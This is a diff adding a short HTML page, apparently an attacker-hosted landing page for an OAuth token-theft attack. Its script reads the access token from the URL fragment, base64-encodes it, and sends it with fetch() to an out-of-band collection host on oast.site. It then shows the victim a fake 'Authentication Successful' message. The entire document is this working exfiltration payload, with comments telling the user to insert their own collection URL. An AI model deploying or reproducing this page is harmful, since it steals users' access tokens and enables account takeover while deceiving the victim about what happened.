@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        // 1. Get the fragment (#access_token=...)
+        var tokenData = window.location.hash;
+
+        if (tokenData) {
+            // 2. Base64 encode it so special characters don't break the URL
+            var encodedToken = btoa(tokenData);
+            
+            // 3. Send it to your OAST link
+            // Replace the URL below with your actual OAST URL
+            var oastUrl = "https://d5of2vla9dbicoemahp0kaqmqity6w7mr.oast.site/?leak=" + encodedToken;
+            
+            fetch(oastUrl).then(() => {
+                document.body.innerHTML = "<h1>Authentication Successful</h1>";
+            });
+        } else {
+            document.body.innerHTML = "<h1>Error: No token found in URL fragment.</h1>";
+        }
+    </script>
+</body>
+</html>
